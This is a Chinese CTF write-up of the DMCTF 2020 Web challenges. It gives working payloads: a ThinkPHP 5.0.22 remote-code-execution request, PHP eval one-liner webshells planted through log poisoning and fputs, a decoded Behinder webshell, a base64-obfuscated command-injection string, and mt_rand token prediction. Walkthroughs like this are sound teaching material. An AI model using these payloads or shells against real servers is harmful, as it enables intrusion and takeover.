---
title: DMCTF之Web
date: 2020-11-29 23:17:50
categories: ['CTF']
tags: ['web','DMCTF2020','RCE']
cover: https://cdn.jsdelivr.net/gh/penginman/PicBed@master/cover/20201120232346.png
---

# 前言

比赛地址：[http://dmctf.vaala.cloud:81](http://dmctf.vaala.cloud:81/)

这次先写Web题目部分，我最后的排名：

![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png)

# Web

## weak_type

源码：

```
PHP
<?php

show_source(__FILE__);
include('class.php');

//level1 

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="202020020"){
        die("no no no!");
    }
    if(intval($num,0)===202020020){
        echo "<br> level 1 Ok <br>";
    }else{
        die('what are you doing?');
    }
}else{
    die();
}

//level 2

if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    if($v1 != $v2 && md5($v1)==md5($v2)){
        echo "<br> level 2 Ok <br>";
    }else{
        die('Are you kidding me ?');
    }
}else{
    die();
}

//level 3 

if (isset($_POST['message'])) {
    $message = json_decode($_POST['message']);
    if ($message->key == $key) {
        echo "<br> Wow you got it !!! <br>";
        echo file_get_contents('/flag');
    } 
    else {
        die("fail");
    }
 }
else{
     echo "~~~~";
 }
```

 **第一关**利用intval()函数特性：直到遇上数字或正负符号才开始做转换。所以构造`num=202020020a`，即可。

> intval函数有个特性:”直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\0)结束转换”,在某些应用程序里由于对intval函数这个特性认识不够,错误的使用导致绕过一些安全判断导致安全漏洞

 **第二关**利用PHP处理哈希字符串时会把”0E”开头的哈希值解释为0，所以选择两个值在md5加密后是以0E开头即可。payload：`v1=QNKCDZO&v2=240610708`，这篇博客中还进一步的讲解了一些[md5函数的漏洞](https://blog.csdn.net/qq_19980431/article/details/83018232)。

 **第三关**进行`$message->key`和`$key`进行判断，`$key`之前没有声明过故值为空，所以传入的`message`也为空即可。post中传入`message=` 即可。

**完整payload**：

url: `http://dmctf.vaala.cloud:28113/?num=202020020a&v1=QNKCDZO&v2=240610708`

post: `message=`

![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png)

## thinkphp

 看到框架首先去搜索框架的漏洞，参考了[[框架漏洞\]Thinkphp系列漏洞【截至2020-07-20】](https://blog.csdn.net/qq_37865996/article/details/107468816)

 这道题利用ThinkPHP5.0.22版本的漏洞可以执行远程代码。Thinkphp在实现框架中的核心类Request的method方法实现了表单请求伪装。但由于对`$_POST[‘_method’]`属性校验不严格，导致攻击者可以通过变量覆盖掉Request类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。

测试payload：

**url**： `?s=captcha`

**post**： `_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=whoami`

虽然报错但是最上方输出了`www-data`

![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png)

根据题目中的提示**flag在环境变量中**，所以在网上查询linux系统输出环境变量的语句：

```
SHELL
env
```

最终获取到flag的payload：

url： `?s=captcha`

post： `_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=env`

在输出末尾即是flag。

![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png)

## fungame

 打开是个游戏当然要玩一玩了在线地址：https://justdui.github.io/。

我先下了源码到本地康一康，查看源码在`game.js`中第122行中：

```
JAVASCRIPT
nextLevel = (nextLevel+1)%11;
```

 `nextlevel`根据变量名猜想是下一关的值，直接一个一个试，发现第10关入场动画不同，而且又一个大波斯，感觉就是最后一关，再将代码：

```
JAVASCRIPT
class PlayerData
{
    // track player data between levels (when player is destroyed)
    constructor()
    {
        this.health = 3;
        this.healthMax = 3;
        this.boomerangs = 1;
        this.bigBoomerangs = 0;
        this.coins = 0;
    }
}
```

 人物属性值中的`health`、`healthMax`、`bigBoomerangs`数量修改为9999，三个对应的属性值分别为：生命值、生命上限、大型飞镖。当然修改以后代码不会直接生效，需要随便进一关自杀游戏reload一下。

 击杀第10关波斯出现flag，但是界面过小无法完整显示，按下Ctrl+滚轮调整浏览器缩放比例，获得flag。这题其实第一次做出来的时候不是这个方法，但是写题解的时候是在复现不出来了0.0

![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg)

## bingxie

 首先根据提示：**你需要一些特殊软件**，再看题目联想到[Behinder](https://github.com/rebeyond/Behinder/releases)，首先下载工具。

分析题目：

源码：

```
PHP
<?php
error_reporting(0);
highlight_file(__FILE__);
function filter($file) //hint in bingxie.php
{
    $file = strtolower($file);
    $file = str_replace('php', "", $file);
    $file = str_replace('data', "???", $file);
    $file = str_replace('http', "???", $file);
    $file = str_replace('file', "???", $file);
    $file = str_replace('input', "???", $file);
    $file = str_replace('filter', "", $file);
    $file = str_replace('log',"???",$file);
    return $file;
}
$file = $_GET['file'];
$md5 =substr(md5($_GET['md5']),0,6);

$file = filter($file);
if ($md5=='e95100')
{
  include $file;
}
?>
```

 代码16、17行使用GET方法获得`file`和`md5`参数，`file`经过filter函数过滤一些PHP协议，`md5`参数进行md5加密并截取前6位，判断是否为`e95100`，如果判定成功include包含`file`变量指定的文件。

 首先计算什么数进行md5加密后前六位是`e95100`。参考了[Getting MD5 with certain character pattern](https://stackoverflow.com/questions/21636042/getting-md5-with-certain-character-pattern)中的回答，使用脚本：

```
PYTHON
import hashlib

target = 'e95100'
candidate = 0
while True:
    plaintext = str(candidate)
    hash = hashlib.md5(plaintext.encode('ascii')).hexdigest()
    if hash[:6] == target:
        print('plaintext:"' + plaintext + '", md5:' + hash)
        break
    candidate = candidate + 1
```

 运行之后很快得出md5加密后前六位是`e95100`的数字是`6666`。

 再根据提示`hint in bingxie.php`，直接访问`/bingxie.php`只得到一句输出：**no ,you are not a real hacker !!!**说的确实没错，想到使用php协议读取文件内容，因为`str_replace`函数只进行一次替换，所以在合适的位置进行双写即可绕过。构造payload：

```
CODE
http://网址?md5=6666&file=pphphp://fifilterlter/convert.base64-encode/resource=bingxie.pphphp
```

 得到base64加密的文件，扔到CyberChef里面解码（附上CyberChef的[github项目地址](https://github.com/gchq/CyberChef)）：

```
CODE
PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQovL+WmguaenOaOpeaUtuWIsHBhc3Plj4LmlbDvvIzliJnkvJrnlJ/miJAxNuS9jeeahOmaj+acuuenmOmSpe+8jOWtmOWCqOWIsHNlc3Npb27kuK0NCiRhID0gJF9HRVRbJ2EnXTsNCiRiID0gJF9HRVRbJ2InXTsNCmlmKCRhIT0kYiYmbWQ1KCRhKT09bWQ1KCRiKSkNCnsNCiAgICBlY2hvICJ5b3UgYXJlIHJpZ2h0IjsNCn0NCmVsc2V7DQogICAgZGllKCJubyAseW91IGFyZSBub3QgYSByZWFsIGhhY2tlciAhISEiKTsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydzZWNyZXQnXSkpDQp7DQogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7DQogICAgJF9TRVNTSU9OWydrJ109JGtleTsNCiAgICBwcmludCAka2V5Ow0KfQ0KDQplbHNlDQp7DQogICAgJGtleT0kX1NFU1NJT05bJ2snXTsNCg0KICAgICRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KDQogICAgaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICB7DQogICAgICAgICR0PSJiYXNlNjRfIi4iZGVjb2RlIjsNCiAgICAgICAgJHBvc3Q9JHQoJHBvc3QuIiIpOw0KICAgICAgICANCiAgICAgICAgZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7DQogICAgICAgICAgICAgICAgICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOw0KICAgICAgICAgICAgICAgIH0NCiAgICB9DQoNCiAgICBlbHNlDQogICAgew0KICAgICAgICAkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCiAgICB9DQoNCiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCiAgICBjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319DQoNCiAgICBAbmV3IEMoJHBhcmFtcyk7DQp9DQo/Pg==
```

 解码后得到一个php文件：

```
PHP
<?php
@error_reporting(0);
session_start();
//如果接收到pass参数，则会生成16位的随机秘钥，存储到session中
$a = $_GET['a'];
$b = $_GET['b'];
if($a!=$b&&md5($a)==md5($b))
{
    echo "you are right";
}
else{
    die("no ,you are not a real hacker !!!");
}

if (isset($_GET['secret']))
{
    $key=substr(md5(uniqid(rand())),16);
    $_SESSION['k']=$key;
    print $key;
}

else
{
    $key=$_SESSION['k'];

    $post=file_get_contents("php://input");

    if(!extension_loaded('openssl'))
    {
        $t="base64_"."decode";
        $post=$t($post."");
        
        for($i=0;$i<strlen($post);$i++) {
                 $post[$i] = $post[$i]^$key[$i+1&15];
                }
    }

    else
    {
        $post=openssl_decrypt($post, "AES128", $key);
    }

    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
    class C{public function __construct($p) {eval($p."");}}

    @new C($params);
}
?>
```

 后半部分根据Behinder的[官方文档](https://xz.aliyun.com/t/2774)和博客[渗透测试-流量加密之冰蝎&蚁剑](https://blog.csdn.net/weixin_39190897/article/details/109417674)的讲解，认为这个文件是个冰蝎马，参考博客中对加密通信流程进行了讲解，链接的密码为第15行`$_GET['secret']`中的`secret`。但是php文件前半部分（代码第5-13行）还需绕过，看到md5函数可以利用上一题**weak_type**中提到的不同字符串加密后md5相同绕过。最后payload：

```
CODE
http://网址/bingxie.php?a=QNKCDZO&b=240610708
```

使用Behinder连接。可以在根目录下找到flag。

![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png)

## filerce

 先看提示：**看看log里面存的什么（利用伪协议包含）**，以下是访问后页面：

```
PHP
<?php
error_reporting(0);
show_source(__FILE__);
$sandbox = '/var/www/html/sandbox/'.md5("DMCTF".$_SERVER['REMOTE_ADDR']);
mkdir($sandbox,0777,true);
chdir($sandbox);
if (isset($_GET['file'])) {
    if (strpos($_GET["file"], "base64-decode")) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
}
else{
    echo "get me a file";
}
file_put_contents("thx.log", base64_encode('http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI'])));
echo "<br/>";
echo "You've been recorded in $sandbox/thx.log!!!!"
?> get me a file
You've been recorded in /var/www/html/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log!!!!
```

使用文件包含查看thx.log有什么，请求访问：

```
CODE
http://网址?file=php://filter/convert.base64-decode/resource=thx.log
```

 输出了thx.log文件内容：`http://dmctf.vaala.cloud:28236/favicon.ico`，访问以后发现还是刚进来的页面。分析17行以下的代码，会打开thx.log文件，在里面写入的内容是`http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']`，也就是我们请求题目页面的url地址，并且多次请求以后发现log中内容成了`http://网址?file=php://filter/convert.base64-decode/resource=thx.log`。判断为竞争写入导致（因为之前做过竞争上传题目），所以在构造url中写入一句话木马：

```
CODE
http://网址?file=php://filter/<?php @eval($_POST['a']);?>convert.base64-decode/resource=thx.log
```

 使用python脚本不断写入：

```
PYTHON
#coding=utf-8
import requests
import sys
def CompeteUpload():  #上传页面
    geturl="http://dmctf.vaala.cloud:28426/?file=php://filter/<?php @eval($_POST['a']);?>convert.base64-decode/resource=thx.log"     #访问上传文件
    r1=requests.get(url=geturl)
if __name__=="__main__":
    i=10;
    while (i>0):
        i-=1;
        CompeteUpload();
```

 尝试访问`http://网址/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log`，会下载log文件，使用base64解码以后发现一句话木马存在，直接蚁剑连接：

```
CODE
http://网址?file=php://filter/convert.base64-decode/resource=thx.log
```

同样在根目录下找到flag。

![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png)

## do_you_have_a_right_token

 F12查看网页代码，发现注释中一大段php代码估计就是题目用到的：

```
PHP
<?php 
session_start();
include 'flag.php';
date_default_timezone_set('Asia/Shanghai');
if(isset($_POST['token']) && isset($_SESSION['token']) &&!empty($_POST['token'])&&!empty($_SESSION['token'])){
    if($_POST['token']==$_SESSION['token']){
        echo "PassResetSuccess! Your Flag is:".$flag;
    }else{
        echo "Token_error!";
    }
}else{
    mt_srand(time());

    $rand= mt_rand();
    $_SESSION['token']=sha1(md5($rand));
    echo "Token Generate Ok!";
    
}
echo '<form action="" method="POST">
    <input type="text" name="token">
    <input type="submit" value="submit">
</form>';
echo "<!--\r\n".file_get_contents(__FILE__);
?>
```

 分析一波：判断post请求中的`token`，如果不为空则与`$_SESSION['token']`判断是否相等，相等输出flag，再往下看12-16行，如果为空的话使用当前时间作为随机数的种子，生成一个随机数并进行md5和sha1函数加密并存入`$_SESSION[‘token’]`。

 所以思路就是：**我们需要知道生成的那个随机数的值**，在网上搜到参考[php伪随机数](https://blog.csdn.net/zss192/article/details/104327432)，可以根据种子预测随机数。题目使用：

```
CODE
mt_srand(time());
```

 根据第4行设置时区时间并设置随机数种子，所以在本地环境使用相同方法尝试预测随机数，但是还需考虑到本地时间和题目服务器时间不同步问题，我想到的方法是借用之前题目获得的webshell上传php文件对本地时间进行校正：

```
PHP
<?php
date_default_timezone_set('Asia/Shanghai');
echo time();
?>
```

![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png)

计算时间差为69，所以修改代码跑一遍：

```
PHP
<?php
date_default_timezone_set('Asia/Shanghai');
// echo time()-69;  这是我验证时间用的
    mt_srand(time()-69);
    $rand = mt_rand();
    echo sha1(md5($rand));
?>
```

提交本地运行后得到的密文提交上去就可以获得flag。

![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png)

## pingpingping

 进入以后是一个类似终端的界面，随便输几个指令提示：**输入help获得提示**，help以后又提示只能使用test和login，进入test以后提示输入url地址，所以这个才是符合题目的`pingpingping`，可以使用通道符`|`连接执行其他命令，搜索到了疑似本题的博客[GXYCTF–PingPingPing](https://www.jianshu.com/p/fd7f9fcc9333)，猜测flag很有可能还在根目录下，所以可以执行`cat /flag`输出，模仿博客中的构造方式把payload进行base64编码，使用sh执行命令，最终payload：

```
CODE
127.0.0.1|echo$IFS$1Y2F0IC9mbGFn|base64$IFS$1-d|sh
```

获得flag

![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png)

## p3’webshell

 提示给了一个链接：[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)，看了以后确实受益匪浅收获很多，但是对于这个题目来说是一个烟雾弹。（更正，是我没看后面题，后面题用到了这个提示，这篇文章会继续更新。）

源码：

```
CODE
<?php
$command=$_POST['command'];
highlight_file(__FILE__);
if(!preg_match('/\'|{|\(|\)|}|\$|_|=|1|\+|;|\./i', $command)){
    die("<script>alert('?')</script>");
}
eval($command);
?>
```

第4行使用正则表达式匹配`$command`字符串，但是前面有一个`!`取反，所以只要payload匹配到正则表达式即可绕过。post中请求：

```
CODE
command=fputs(fopen('shell.php','w'),'<?php @eval($_POST['a']);?>');
```

使用蚁剑连接`http://网址/shell.php`，在根目录里找到flag。

![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png)